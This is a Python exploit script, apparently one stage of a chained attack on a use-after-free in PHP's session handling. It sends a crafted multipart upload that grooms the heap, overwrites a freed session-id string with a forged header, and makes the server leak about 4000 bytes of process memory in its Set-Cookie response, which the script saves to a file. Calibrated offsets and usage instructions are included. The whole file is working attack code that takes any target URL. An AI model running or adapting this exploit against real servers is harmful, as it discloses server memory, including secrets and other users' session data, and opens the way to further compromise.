#!/usr/bin/env python3
"""Payload B: forge a 4000-byte session id over the stale PS(id) chunk.

With `display_errors=Off` and a successful payload A, the worker keeps a stale
`PS(id)` that points at a freed `zend_string`. This request re-allocates that
chunk with attacker data and places a fake `zend_string` header inside it, so
`php_session_send_cookie()` serialises `read_len` bytes into the `Set-Cookie`
value instead of the usual 26-48.

Difference from the public `send_b_open.py`: the forged header sits at an
absolute offset D inside the BF value, independent of the total value length.
That lets the header line up with the real `PS(id)` address, which in the
reference build falls on page 510 of the cached chunk (not 511).

Usage:
    python3 b_forge.py --url http://127.0.0.1:18080/index.php \
        --n 40 --bb1 1048551 --d 1036288 --read 4000

Parameters:
    --n          fields of 231 B (resolves ps_close_files)
    --bb1        length of field 'P' that packs the 1 MiB chunk (255/256 pages)
    --d          offset of the forged header inside the BF value
    --read       length written into the fake header (4000/5000)
    --fill       BF value length
    --drain      fields of 31 B (bin-56) that consume the free list
    --fillers    filler fields that fill pages of the main chunk
    --filler-len filler value length

Field order: n, bb1, BF, fillers, drain, PHPSESSID, progress. Drain and fillers
come after BF so they do not shift the BF buffer.

The defaults are the calibrated reference-build values; they are sensitive to
the PHP build, worker count, warm-up and ASLR setting. Re-measure before
trusting them (see the sweep driver and the probe).
"""

import argparse
import os
import socket
import struct
import urllib.parse


def build_multipart(n, bb1_len, d, read_len, fill_len, drain=0,
                    fillers=0, filler_len=1500):
    bnd = b'B' * 10
    parts = []

    for i in range(n):
        parts.append((str(1000 + i).encode(), b'V' * 231))

    if bb1_len > 0:
        parts.append((b'900001', b'P' * bb1_len))

    # BF value: 'Q' padding up to D, forged header at D-24..D-8, then 'M'.
    if fill_len <= d:
        raise SystemExit("fill_len must be greater than d")
    buf = bytearray(b'Q' * fill_len)
    struct.pack_into('<Q', buf, d - 24, 0x4141414141414141)  # gc
    struct.pack_into('<Q', buf, d - 16, 0)                   # h
    struct.pack_into('<Q', buf, d - 8, read_len)             # len
    buf[d:] = b'M' * (fill_len - d)
    parts.append((b'900002', bytes(buf)))

    # Main-chunk fillers AFTER the BF buffer: do not shift the forge.
    for i in range(fillers):
        parts.append((('f%04d' % i).encode(), b'F' * filler_len))

    # bin-56 drain: consume the free list so the session HashTable carves the
    # single free page of the id chunk.
    for i in range(drain):
        parts.append((('d%03d' % i).encode(), b'D' * 31))

    parts.append((b'PHPSESSID', b'attacksessionid0001'))
    parts.append((b'PHP_SESSION_UPLOAD_PROGRESS', b'pwn'))

    body = bytearray()
    for name, data in parts:
        body += b'--' + bnd + b'\r\n'
        body += b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
        body += data + b'\r\n'
    body += b'--' + bnd + b'--\r\n'
    return bytes(body), bnd


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--n", type=int, default=40)
    ap.add_argument("--bb1", type=int, default=1048551)
    ap.add_argument("--d", type=int,
                    default=int(os.environ.get("B_D", "1036288")),
                    help="253*4096: header on page 510 if the value starts at 257")
    ap.add_argument("--read", type=int,
                    default=int(os.environ.get("B_READ", "4000")))
    ap.add_argument("--fill", type=int,
                    default=int(os.environ.get("B_FILL", "1040384")),
                    help="BF value length")
    ap.add_argument("--drain", type=int,
                    default=int(os.environ.get("B_DRAIN", "0")))
    ap.add_argument("--fillers", type=int,
                    default=int(os.environ.get("B_FILLERS", "0")))
    ap.add_argument("--filler-len", type=int,
                    default=int(os.environ.get("B_FILLER_LEN", "1500")))
    ap.add_argument("--out", default="b_forge.resp")
    args = ap.parse_args()

    body, bnd = build_multipart(args.n, args.bb1, args.d, args.read,
                                args.fill, args.drain, args.fillers,
                                args.filler_len)
    p = urllib.parse.urlparse(args.url)
    path = p.path or "/index.php"
    host = p.netloc

    req = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n" % (path, host, bnd.decode(), len(body))
    ).encode() + body

    s = socket.create_connection((p.hostname, p.port or 80), timeout=60)
    s.settimeout(60)
    resp = bytearray()
    try:
        s.sendall(req)
        while len(resp) < 2_000_000:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    except OSError:
        pass
    s.close()
    open(args.out, 'wb').write(bytes(resp))
    print("RESP_LEN", len(resp))


if __name__ == "__main__":
    main()
